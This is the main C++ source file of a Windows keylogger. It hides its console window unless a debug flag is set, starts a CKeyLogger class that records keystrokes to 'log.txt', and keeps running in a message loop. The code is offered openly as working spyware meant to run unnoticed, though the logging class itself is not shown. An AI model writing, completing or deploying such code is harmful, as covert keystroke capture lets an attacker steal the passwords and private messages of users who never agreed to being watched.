#include "pch.h"

// String
#include <string>

// Windows specific functions
#include <Windows.h>

// Key logger class
#include "CKeyLogger.hpp"


// ---------------------------------------------------------------------------------------------

// Whether or not to show the console window for debugging purposes
#define isDebugging false

// The path to the log file
#define logFilePath "log.txt"


// ---------------------------------------------------------------------------------------------

// On program run
int main()
{
	// First we remove the console window (If we are not in debugging mode and we are building for console)
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	if (!isDebugging)
		ShowWindow(window, 0);

	if (CKeyLogger::startLogging(logFilePath))
	{
		// Stay in the program until we're told to stop
		MSG msg;
		while (!GetMessage(&msg, NULL, NULL, NULL)) {
			TranslateMessage(&msg);
				DispatchMessage(&msg);
		}

		CKeyLogger::shutdownKeyLogger();
	}

	// Quit program
	return 0;
}